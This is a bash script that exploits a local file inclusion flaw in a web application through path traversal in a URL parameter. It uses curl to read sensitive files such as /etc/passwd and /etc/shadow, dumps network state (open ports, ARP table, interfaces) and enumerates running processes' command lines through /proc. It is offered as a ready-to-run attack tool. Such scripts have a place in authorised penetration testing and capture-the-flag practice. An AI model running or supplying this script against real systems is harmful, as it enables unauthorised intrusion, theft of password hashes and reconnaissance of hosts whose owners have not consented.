#!/bin/bash
#Usage
# the url needs to be the root path so the rest of the script works
#bash ./lfi-enum.bash http://0.0.0.0:8000/?page=../../../../ >> lfi-enum-linux.txt

echo "---Enum Common Filenames"

#URL input as commandline Argument
url="$1"

files=("/etc/passwd" "/etc/crontab" "/proc/mounts" "/etc/issue" "/proc/version" "/etc/resolv.conf" "/etc/hostname" "/etc/anacrontab" "/etc/shadow" "/proc/net/tcp")
for filename in ${files[@]};do
  echo "----$filename----"
  curl --silent "$url$filename" 
  echo
done

echo "---Enum Network Info"

tempfile="$(mktemp)"

curl --silent "$url/proc/net/tcp" -o "$tempfile"
echo "TCP Open Ports"
python3 linux_net_tcp.py "$tempfile"
echo 

curl --silent "$url/proc/net/udp" -o "$tempfile"
echo "UDP Open Ports"
python3 linux_net_tcp.py "$tempfile"
echo

echo "ARP Table"
curl --silent "$url/proc/net/arp" 
echo

echo "Interfaces"
curl --silent "$url/proc/net/dev"| cut -d ":" -f 1 | tail -n +3 | sort -u | sed -e 's/[ \t]*//'

echo "---Enum Process Info"

set -eu

max=20
url="$1"
maxpid="$(curl --silent "$url/proc/sys/kernel/pid_max")"
selfcmdline="$(curl --silent "$url/proc/self/cmdline" | strings | tr '\r\n' ' ')"

function getpid(){
  pid="$1"
  cmdline="$(curl --silent "$url/proc/$pid/cmdline" | strings | tr '\r\n' ' ')"
  if [[ "$cmdline" != "" && "$cmdline" != "$selfcmdline" ]];then
    echo -e "PID: $pid\t$cmdline"
  fi
}

#the for loop here may run forever, you may have to terminate it with ctrl-c
for ((pid=1; pid<="$maxpid"; pid++));do
  while [[ $(jobs -l | grep Running | wc -l 2> /dev/null) -gt $max ]];do
    sleep 0.3
  done
  getpid "$pid" &
done

echo "Enum Finished"
